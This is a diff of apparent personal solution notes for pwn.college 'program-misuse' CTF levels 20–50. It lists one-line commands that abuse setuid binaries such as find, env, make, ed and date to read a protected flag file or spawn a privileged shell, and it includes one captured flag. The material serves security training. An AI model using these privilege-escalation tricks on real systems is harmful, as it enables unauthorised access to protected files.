@@ -1,2 +1,65 @@
+https://gtfobins.github.io/gtfobins
+https://ihsansencan.github.io/tools-tips-tricks/metasploit.html
 ## Level 20
 tar xf flag -I '/bin/sh -c "cat 1>&2"' 
+## Level 21
+ar r $(mktemp -u) flag
+cat /tmp/xxxx
+## Level 22
+echo flag | cpio -o
+## Level 23
+genisoimage -sort flag
+## Level 24
+env /bin/sh -p; cat flag
+## Level 25
+find . -exec /bin/sh -p \; -quit
+## Level 26
+make -s --eval=$'x:\n\t-'"cat flag"
+## Level 27
+nice /bin/sh -p
+## Level 28
+timeout 7d /bin/sh -p
+## Level 29
+stdbuf -i0 /bin/sh -p
+## Level 30
+setarch $(arch) /bin/sh -p
+## Level 31
+watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
+## Level 32
+socat -u "file:flag" -
+## Level 33
+whiptail --textbox --scrolltext "$LFILE" 20 20
+## Level 34
+awk '//' flag
+## Level 35
+sed "" flag
+## Level 36
+hacker@program-misuse-level-36:/$ ed flag
+57
+,p
+pwn.college{AyydZzCMwBTgbbEqN0KfUNu1JfY.0FO3EDL0MzNyQzW}
+q
+## Level 37
+chown hacker:hacker flag
+## Level 38
+chmod +r flag
+## Level 39
+cp flag /dev/stdout
+## Level 40
+## Level 42
+python -c 'print(open("flag").read())'
+## Level 43
+## Level 44
+bash -s
+## Level 45
+date -f ../flag
+## Level 46
+dmesg -rF flag
+## Level 47
+wc --files0-from flag
+## Level 48
+gcc -x c -E flag
+## Level 49
+as @flag
+## Level 50
+
